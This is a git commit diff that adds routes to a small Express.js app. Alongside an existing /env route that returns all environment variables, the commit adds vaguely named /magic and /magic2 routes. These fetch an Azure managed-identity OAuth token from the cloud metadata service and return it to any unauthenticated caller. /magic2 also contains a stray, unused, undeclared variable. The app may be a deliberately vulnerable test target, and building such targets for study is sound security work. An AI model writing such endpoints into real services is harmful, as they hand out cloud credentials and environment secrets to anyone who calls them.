7e23877f5e62e385e9f0d3449755360de22f92a1
Ryan Shaut <ryan@shaut.us>
2022-10-19 17:07:39 -0400

    add more routes

--- src/index.js
+++ src/index.js
@@ -7,6 +7,10 @@ app.get("/", (req, res) => {
     res.send("Hello world!");
 });
 
+app.get("/ping", (req, res) => {
+    res.send(req.params);
+});
+
 app.get("/env", (req, res) => {
     res.send(process.env);
 });
@@ -24,6 +28,34 @@ app.get("/random", async (req, res) => {
 app.get("/info", async (req, res) => {
     try {
         const data = await axios.get("https://random-data-api.com/api/users/random_user");
+        res.send(data.data);
+    } catch (err) {
+        console.log("error: ", err);
+        res.send(err);
+    }
+});
+app.get("/magic", async (req, res) => {
+    try {
+        const data = await axios.get("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", {
+            headers: {
+                Metadata: 'true'
+            }
+        });
+        res.send(data.data);
+    } catch (err) {
+        console.log("error: ", err);
+        res.send(err);
+    }
+});
+app.get("/magic2", async (req, res) => {
+
+    url= req.params.url
+    try {
+        const data = await axios.get("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", {
+            headers: {
+                Metadata: 'true'
+            }
+        });
         res.send(data.data);
     } catch (err) {
         console.log("error: ", err);
